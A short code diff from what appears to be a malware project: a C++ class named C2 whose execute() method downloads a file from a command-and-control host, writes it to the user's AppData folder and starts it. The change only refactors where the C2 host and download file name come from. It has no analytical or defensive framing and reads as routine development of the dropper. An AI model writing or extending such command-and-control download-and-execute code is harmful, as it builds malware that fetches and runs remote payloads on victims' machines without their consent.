@@ -9,15 +9,6 @@
 #include <iostream>
 
 
-
-void C2::setHostName(LPCSTR hostName) {
-	this->hostName = hostName;
-}
-
-void C2::setPathName(LPCSTR pathName) {
-	this->pathName = pathName;
-}
-
 void C2::execute() {
 	this->download();
 	this->start();
@@ -36,7 +27,7 @@ string C2::boolToString(bool b) {
 }
 
 void C2::download() {
-	this->netsend(this->hostName, this->pathName);
+	this->netsend(this->util.getC2Host(), this->util.getDownloadFileName().c_str());
 	
 	BYTE buffer = 0;
 	std::ofstream ostream(this->util.getAppDataPath() + this->util.getDownloaded(), std::ios::binary);
